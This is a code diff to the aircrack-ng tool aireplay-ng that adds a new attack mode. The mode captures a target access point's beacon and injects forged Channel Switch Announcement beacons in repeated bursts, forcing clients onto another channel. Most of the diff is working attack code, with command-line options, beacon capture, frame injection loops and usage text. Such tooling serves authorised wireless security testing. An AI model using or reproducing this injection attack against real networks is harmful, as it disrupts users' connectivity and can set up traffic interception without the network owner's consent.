@@ -53,6 +53,7 @@
 #include <unistd.h>
 #include <signal.h>
 #include <string.h>
+#include <strings.h>
 #include <stdlib.h>
 #include <stdio.h>
 #include <errno.h>
@@ -74,6 +75,7 @@
 #include "aircrack-ng/support/common.h"
 #include "aircrack-ng/utf8/verifyssid.h"
 #include "aircrack-ng/tui/console.h"
+#include "csa.h"
 
 #define RTC_RESOLUTION 8192
 
@@ -112,6 +114,123 @@
 #define PROBE_REQ                                                              \
 	"\x40\x00\x00\x00\xFF\xFF\xFF\xFF\xFF\xFF\xCC\xCC\xCC\xCC\xCC\xCC"         \
 	"\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00"
+
+enum
+{
+	CSA_DEFAULT_CHANNEL = 14,
+	CSA_BURST_SIZE = 64,
+};
+
+extern struct communication_options opt;
+extern struct devices dev;
+extern struct wif * _wi_in;
+extern struct wif * _wi_out;
+extern uint8_t h80211[4096];
+
+static volatile sig_atomic_t ctrl_c;
+
+static unsigned char * find_tag_data(unsigned char * tagged_params,
+									 const size_t tagged_len,
+									 const unsigned char tag_id,
+									 size_t * value_len)
+{
+	size_t pos = 0;
+
+	if (tagged_params == NULL || value_len == NULL) return (NULL);
+	if (tagged_len < 2) return (NULL);
+
+	while (pos < tagged_len)
+	{
+		size_t cur_len;
+		size_t cur_total_len;
+
+		if (tagged_len - pos < 2) return (NULL);
+		cur_len = tagged_params[pos + 1];
+		cur_total_len = cur_len + 2;
+		if (cur_total_len > tagged_len - pos) return (NULL);
+		if (tagged_params[pos] == tag_id)
+		{
+			*value_len = cur_len;
+			return (tagged_params + pos + 2);
+		}
+		pos += cur_total_len;
+	}
+
+	return (NULL);
+}
+
+static int capture_target_beacon(uint8_t * beacon, size_t * beacon_len)
+{
+	struct timeval start_tv, now_tv, wait_tv;
+	fd_set rfds;
+	int caplen;
+
+	REQUIRE(beacon != NULL);
+	REQUIRE(beacon_len != NULL);
+
+	if (dev.fd_in < 0) return (-1);
+
+	gettimeofday(&start_tv, NULL);
+
+	while (1)
+	{
+		if (ctrl_c) return (-1);
+
+		gettimeofday(&now_tv, NULL);
+		if (((now_tv.tv_sec - start_tv.tv_sec) * 1000000L
+			 + (now_tv.tv_usec - start_tv.tv_usec))
+			> 10000000L)
+		{
+			return (-1);
+		}
+
+		FD_ZERO(&rfds);
+		FD_SET(dev.fd_in, &rfds);
+		wait_tv.tv_sec = 0;
+		wait_tv.tv_usec = 100000;
+
+		caplen = select(dev.fd_in + 1, &rfds, NULL, NULL, &wait_tv);
+		if (caplen < 0)
+		{
+			if (errno == EINTR) continue;
+			perror("select failed");
+			return (-1);
+		}
+
+		if (caplen == 0 || !FD_ISSET(dev.fd_in, &rfds)) continue;
+
+		caplen = read_packet(_wi_in, beacon, (uint32_t) *beacon_len, NULL);
+		if (caplen <= 0) continue;
+		if (caplen < 36) continue;
+		if (beacon[0] != 0x80) continue;
+
+		if (memcmp(opt.r_bssid, NULL_MAC, 6) != 0
+			&& memcmp(beacon + 10, opt.r_bssid, 6) != 0
+			&& memcmp(beacon + 16, opt.r_bssid, 6) != 0)
+		{
+			continue;
+		}
+
+		if (opt.r_essid[0] != '\0')
+		{
+			size_t ssid_len = 0;
+			unsigned char * ssid = find_tag_data(beacon + 36,
+												 (size_t) caplen - 36,
+												 IEEE80211_ELEMID_SSID,
+												 &ssid_len);
+			if (ssid == NULL) continue;
+			if (ssid_len > 32) ssid_len = 32;
+			if (strlen(opt.r_essid) != ssid_len
+				|| strncasecmp(opt.r_essid, (char *) ssid, ssid_len) != 0)
+			{
+				continue;
+			}
+		}
+
+		*beacon_len = (size_t) caplen;
+		return (0);
+	}
+}
 
 static const char usage[] =
 
@@ -181,10 +300,12 @@ static const char usage[] =
 	"cfg80211\n"
 	"      --deauth-rc rc        : Deauthentication reason code [0-254] "
 	"(Default: 7)\n"
+	"      --csa-channel ch, -C ch: CSA target channel (Default: 14)\n"
 	"\n"
 	"  Attack modes (numbers can still be used):\n"
 	"\n"
 	"      --deauth      count : deauthenticate 1 or all stations (-0)\n"
+	"      --csa         count : inject CSA beacons in 64-frame bursts\n"
 	"      --fakeauth    delay : fake authentication with AP (-1)\n"
 	"      --interactive       : interactive frame selection (-2)\n"
 	"      --arpreplay         : standard ARP-request replay (-3)\n"
@@ -233,7 +354,7 @@ static const unsigned char ska_auth3[4096]
 	= "\xb0\x40\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 	  "\x00\x00\x00\x00\x00\x00\xc0\x01";
 
-static int ctrl_c, alarmed;
+static volatile sig_atomic_t alarmed;
 
 static void sighandler(int signum)
 {
@@ -559,6 +680,121 @@ static int do_attack_deauth(void)
 
 				usleep(2000);
 			}
+		}
+	}
+
+	return (EXIT_SUCCESS);
+}
+
+static int do_attack_csa(void)
+{
+	int i, n;
+	size_t beacon_len;
+
+	if (getnet(_wi_in,
+			   NULL,
+			   0,
+			   1,
+			   opt.f_bssid,
+			   opt.r_bssid,
+			   (uint8_t *) opt.r_essid,
+			   opt.ignore_negative_one,
+			   opt.nodetect)
+		!= 0)
+	{
+		return (EXIT_FAILURE);
+	}
+
+	{
+		int input_channel = wi_get_channel(_wi_in);
+		int output_channel = wi_get_channel(_wi_out);
+		int channel_status
+			= csa_check_channels(input_channel,
+							 output_channel,
+							 opt.ignore_negative_one);
+
+		if (channel_status == CSA_CHANNEL_UNKNOWN_ALLOWED)
+		{
+			printf("Warning: unable to verify that capture and injection "
+				   "interfaces are on the same channel.\n");
+		}
+		else if (channel_status == CSA_CHANNEL_MISMATCH)
+		{
+			if (input_channel == -1 || output_channel == -1)
+			{
+				printf("Unable to determine the capture or injection interface "
+					   "channel; use --ignore-negative-one to continue.\n");
+			}
+			else
+			{
+				printf("Capture interface is on channel %d, but injection "
+					   "interface is on channel %d.\n",
+					   input_channel,
+					   output_channel);
+			}
+			return (EXIT_FAILURE);
+		}
+	}
+
+	ctrl_c = 0;
+	if (signal(SIGINT, sighandler) == SIG_ERR)
+	{
+		perror("signal(SIGINT)");
+		return (EXIT_FAILURE);
+	}
+
+	beacon_len = sizeof(h80211);
+	if (capture_target_beacon(h80211, &beacon_len) != 0)
+	{
+		if (ctrl_c) return (EXIT_SUCCESS);
+		printf("Unable to capture a matching beacon frame.\n");
+		return (EXIT_FAILURE);
+	}
+
+	if (csa_build_beacon(h80211,
+					  &beacon_len,
+					  sizeof(h80211),
+					  IEEE80211_ELEMID_CSA,
+					  opt.csa_channel)
+		!= 0)
+	{
+		printf("Unable to build CSA beacon frame.\n");
+		return (EXIT_FAILURE);
+	}
+
+	n = 0;
+
+	while (!ctrl_c)
+	{
+		if (opt.a_count > 0 && ++n > opt.a_count) break;
+
+		usleep(180000);
+		if (ctrl_c) break;
+
+		PCT;
+		printf("Sending CSA beacon (channel %u). BSSID:"
+			   " [%02X:%02X:%02X:%02X:%02X:%02X]\n",
+			   opt.csa_channel,
+			   opt.r_bssid[0],
+			   opt.r_bssid[1],
+			   opt.r_bssid[2],
+			   opt.r_bssid[3],
+			   opt.r_bssid[4],
+			   opt.r_bssid[5]);
+
+		for (i = 0; i < CSA_BURST_SIZE && !ctrl_c; i++)
+		{
+			if (send_packet(_wi_out,
+							h80211,
+							beacon_len,
+							kRewriteSequenceNumber)
+				< 0)
+			{
+				if (ctrl_c) break;
+				return (EXIT_FAILURE);
+			}
+
+			usleep(2000);
 		}
 	}
 
@@ -5992,6 +6228,7 @@ int main(int argc, char * argv[])
 	opt.reassoc = 0;
 	opt.deauth_rc = 7; /* By default deauth reason code is Class 3 frame
 						  received from nonassociated STA */
+	opt.csa_channel = CSA_DEFAULT_CHANNEL;
 
 /* XXX */
 #if 0
@@ -6015,6 +6252,8 @@ int main(int argc, char * argv[])
 
 		static struct option long_options[]
 			= {{"deauth", 1, 0, '0'},
+			   {"csa", 1, 0, 'A'},
+			   {"csa-channel", 1, 0, 'C'},
 			   {"fakeauth", 1, 0, '1'},
 			   {"interactive", 0, 0, '2'},
 			   {"arpreplay", 0, 0, '3'},
@@ -6034,7 +6273,7 @@ int main(int argc, char * argv[])
 		int option = getopt_long(argc,
 								 argv,
 								 "b:d:s:m:n:u:v:t:Z:T:f:g:w:x:p:a:c:h:e:ji:r:k:"
-								 "l:y:o:q:Q0:1:23456789HFBDR",
+								 "l:y:o:q:Q0:1:23456789A:C:HFBDR",
 								 long_options,
 								 &option_index);
 
@@ -6186,6 +6425,46 @@ int main(int argc, char * argv[])
 				if (ret != 1)
 				{
 					printf("Invalid deauth reason. [0-254]\n");
+					printf("\"%s --help\" for help.\n", argv[0]);
+					return (1);
+				}
+				break;
+
+			case 'C':
+
+				{
+					int csa_channel = 0;
+
+					ret = sscanf(optarg, "%d", &csa_channel);
+					if (ret != 1 || csa_channel < 1 || csa_channel > 255)
+					{
+						printf("Invalid CSA channel. [1-255]\n");
+						printf("\"%s --help\" for help.\n", argv[0]);
+						return (1);
+					}
+					opt.csa_channel = (uint8_t) csa_channel;
+				}
+				break;
+
+			case 'A':
+
+				if (opt.a_mode != -1)
+				{
+					printf("Attack mode already specified.\n");
+					printf("\"%s --help\" for help.\n", argv[0]);
+					return (1);
+				}
+				opt.a_mode = 10;
+
+				for (i = 0; optarg[i] != 0; i++)
+				{
+					if (isdigit((int) optarg[i]) == 0) break;
+				}
+
+				ret = sscanf(optarg, "%d", &opt.a_count);
+				if (opt.a_count < 0 || optarg[i] != 0 || ret != 1)
+				{
+					printf("Invalid CSA count or missing value. [>=0]\n");
 					printf("\"%s --help\" for help.\n", argv[0]);
 					return (1);
 				}
@@ -6770,6 +7049,8 @@ int main(int argc, char * argv[])
 			return (do_attack_migmode());
 		case 9:
 			return (do_attack_test());
+		case 10:
+			return (do_attack_csa());
 		default:
 			break;
 	}
